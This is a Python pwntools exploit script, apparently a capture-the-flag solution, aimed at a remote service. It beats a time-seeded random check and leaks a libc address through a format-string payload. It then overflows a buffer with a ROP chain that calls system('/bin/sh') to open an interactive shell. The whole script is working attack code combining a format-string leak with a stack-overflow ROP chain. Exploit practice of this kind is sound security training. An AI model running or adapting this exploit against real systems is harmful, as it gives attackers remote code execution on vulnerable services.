from pwn import *
from ctypes import CDLL

context.binary = binary = ELF('./chall', checksec=False)
# context.log_level = 'debug'

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')


# Connect to the remote service
# r = process()
r = remote("34.45.81.67", 16004)
# r = remote("127.0.1", 5000)

# Seed the random number generator with the current time
seed = libc.time(0x0)
libc.srand(seed)

nhonks = libc.rand() % 0x5b + 10
print(nhonks)
r.sendline("A")
r.sendline(str(nhonks))
# sleep(10)
r.sendline("%57$p")
# r.recvuntil(b"what message would you like")
# r.recvuntil(b"what's your name again?wow ")
r.recvuntil(b'so A. how many honks?\n')
leak = r.recvline().strip()
print(f"Leaked address: {leak}")
data = r.recv(9999).strip()
match = re.search(rb"wow (0x[0-9a-fA-F]+)", data)
leaked_addr = 0
if match:
    leaked_addr = int(match.group(1), 16)
    print(f"[+] Leaked address: {hex(leaked_addr)}")
else:
    print("[-] Failed to find leak.")

libc_base = leaked_addr - 0x2a1ca
print(f"Libc base address: {hex(libc_base)}")
libc = ELF('./libc.so.6')
libc.address = libc_base
offset = 376
# sleep(6)
rop = ROP(libc)
rop.raw(b"A" * offset)  # padding
rop.raw(rop.find_gadget(["pop rdi", "ret"])[0])  # 
rop.raw(next(libc.search(b"/bin/sh\x00"))) # NULL
rop.raw(rop.find_gadget(["ret"])[0])
rop.raw(libc.sym['system'])  # system
r.sendline(rop.chain())
r.interactive()